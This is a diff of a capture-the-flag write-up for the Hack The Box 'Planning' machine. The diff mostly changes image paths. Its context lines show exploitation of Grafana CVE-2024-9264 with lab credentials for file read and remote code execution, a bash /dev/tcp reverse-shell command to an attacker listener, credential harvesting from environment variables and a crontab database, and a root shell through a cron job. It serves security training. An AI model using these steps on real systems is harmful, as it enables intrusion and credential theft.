@@ -30,7 +30,7 @@ echo '10.10.11.68 planning.htb' | sudo tee -a /etc/hosts
 ```
 
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250601143242.png)
+![](Pasted image 20250601143242.png)
 
 At first sight, we can see this, source code seems normal, we can try fuzzing to check anything unusual on here:
 
@@ -104,7 +104,7 @@ grafana.planning.htb
 Let's add it and check it:
 
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250601144846.png)
+![](Pasted image 20250601144846.png)
 
 It contains a login page, let's login using our credentials:
 
@@ -113,7 +113,7 @@ It contains a login page, let's login using our credentials:
 admin:0D5oT70Fq13EvB5r
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250601145023.png)
+![](Pasted image 20250601145023.png)
 
 We are inside of Grafana, Grafana is an **open-source analytics and monitoring platform** used to visualize and analyze metrics from various data sources (like databases, cloud services, or time-series databases such as Prometheus). It enables users to create **interactive dashboards** with real-time charts, graphs, and alerts, making complex data accessible and actionable.
 
@@ -127,12 +127,12 @@ Knowing all this, we can begin exploitation.
 First of all, let's check the version of the Grafana panel we are in, we can do this by clicking the `(?)` button on top right of the screen:
 
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250601145933.png)
+![](Pasted image 20250601145933.png)
 
 As seen, we are dealing with `Grafana V.11.0.0`, let's check an exploit for this version:
 
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250601150010.png)
+![](Pasted image 20250601150010.png)
 
 We find `CVE-2024-9264`, let's check it out:
 
@@ -140,8 +140,8 @@ We find `CVE-2024-9264`, let's check it out:
 Link: https://github.com/nollium/CVE-2024-9264
 
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250601150053.png)
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250601150331.png)
+![](Pasted image 20250601150053.png)
+![](Pasted image 20250601150331.png)
 
 
 Ok, so based on this, we can perform arbitrary file read and luckily for us, even RCE, let's test the script:
@@ -175,7 +175,7 @@ grafana:x:472:0::/home/grafana:/usr/sbin/nologin
 ```
 
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250601150134.png)
+![](Pasted image 20250601150134.png)
 
 It works perfectly, we can see the `/etc/passwd` file, based on that, let's try to achieve RCE, we can do:
 
@@ -183,7 +183,7 @@ It works perfectly, we can see the `/etc/passwd` file, based on that, let's try 
 python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "id" http://grafana.planning.htb
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250601150417.png)
+![](Pasted image 20250601150417.png)
 
 As seen, RCE works perfectly, let's get ourselves a shell, set up a listener and do:
 
@@ -194,7 +194,7 @@ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "bash -c "exec 5<>/dev/
 
 If we got our listener ready, we will receive the connection:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250601151847.png)
+![](Pasted image 20250601151847.png)
 
 
 Let's begin privilege escalation.
@@ -216,11 +216,11 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250601151943.png)
+![](Pasted image 20250601151943.png)
 
 We are inside of a docker container as the root user, we need a way to escape from it, let's use linpeas to check any way to get out of here:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250601152428.png)
+![](Pasted image 20250601152428.png)
 
 If we take a closer look at the environment variables, we can see credentials:
 
@@ -231,13 +231,13 @@ enzo:RioTecRANDEntANT!
 Let's go into ssh:
 
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250601152513.png)
+![](Pasted image 20250601152513.png)
 
 Well, we were able to escape the docker container, let's use linpeas again:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250601153316.png)
+![](Pasted image 20250601153316.png)
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250601153429.png)
+![](Pasted image 20250601153429.png)
 
 We got two interesting stuff, first, port `8000` is open inside of the machine, we can use ssh tunneling to access to it, then, we got a `crontab.db` file inside of `/opt/crontab`, let's get the db and take a look at it:
 
@@ -276,7 +276,7 @@ As seen, we get a password, let's do ssh tunneling and check if there's any logi
 ssh -L 9000:127.0.0.1:8000 enzo@planning.htb
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250601153920.png)
+![](Pasted image 20250601153920.png)
 
 As expected, we need to use the credentials:
 
@@ -284,18 +284,18 @@ As expected, we need to use the credentials:
 root:P4ssw0rdS0pRi0T3c
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250601154055.png)
+![](Pasted image 20250601154055.png)
 
 There we go, now, in order to get a root shell, we need to analyze the behavior of this, for example, we can check that we can create and run commands, so we can simply create a reverse shell command and run it:
 
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250601154221.png)
+![](Pasted image 20250601154221.png)
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250601154259.png)
+![](Pasted image 20250601154259.png)
 
 Save the entry, set the listener and run it:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250601154329.png)
+![](Pasted image 20250601154329.png)
 
 There we go, we got our shell as root, let's read both flags and end the CTF:
 
@@ -307,7 +307,7 @@ root@planning:/# cat /root/root.txt
 064d746b9baf3f4074796e2d4d8ea150
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250601154429.png)
+![](Pasted image 20250601154429.png)
 
 
 https://www.hackthebox.com/achievement/machine/1872557/660
